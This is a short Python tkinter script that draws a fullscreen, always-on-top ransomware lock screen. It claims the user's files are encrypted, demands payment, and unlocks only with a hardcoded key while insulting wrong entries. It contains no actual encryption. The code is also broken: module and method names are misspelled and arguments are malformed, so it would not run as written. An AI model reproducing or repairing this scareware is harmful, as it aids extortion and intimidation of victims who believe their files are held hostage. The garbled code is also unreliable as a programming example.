import tinker as tk 
from PIL import image, ImageTk
import sys

SECRET_KEY = "No mercy"

def check_key():
  if entry_get() == SECRET_KEY:
     root.destroy()
  else:
    error_label.config(text="WRONG KEY DUMB BITCH")

root = tk.Tk()
root.title("NMFS")
root.attributes("-fullscreen", True)
root.attributes("-topmost", True)

screen_w = root.winfo_screenwidth()
screen_h = root.winfo_screenheight()

img = image.open("/home/n0m3rcy/project/Untitled_Nero_AI_Image_Upscaler_Reconstruct.jpeg")
img = img.rezixe((screen_w, screen_h), Image.LANCZOS)
bg_photo = ImageTL.PhotoImage(img)

canvas = tk.Canvas(root, width=screen_w, height=screen_h)
canvas.pack(fill="both", expand=True)
canvas.create_image(0, 0, image=bg_photo, anchor="nw")

canvas.create_text(screen_w//2, screen_h//2 - 100,
    text="YOUR FILES HAVE BEEN ENCRYPTED",
    font=("Courier", 28, "bold"), fill="red")

canvas.create_text(screen_w//2, screen_h//2 - 50,
  text="SEND PAYMENT TO OTRISKO TO RECEIVE KEY.",
  font=("Courier", 14), fill="white")

frame = tk.Frame(root, bg="black")
canvas.create_window(screen_w//2, screen_h//2 + 30, windows=frame)

entry = tk.Entry(frame, font=("courier", 18), bg="black", fg="green",
            insertbackground="green", show="*", width=30)
entry.pack(pady=5)

btn = tk.Button(frame, text="DECRYPT", font=("Courier, 14"),
           bg="red", fg="white", command=check_key)
btn.pack(pady=5)

error_label = tk.Label(frame, text="", font=("courier", 12),
                fg="red", bg="black")
error_label.pack()
root.mainloop()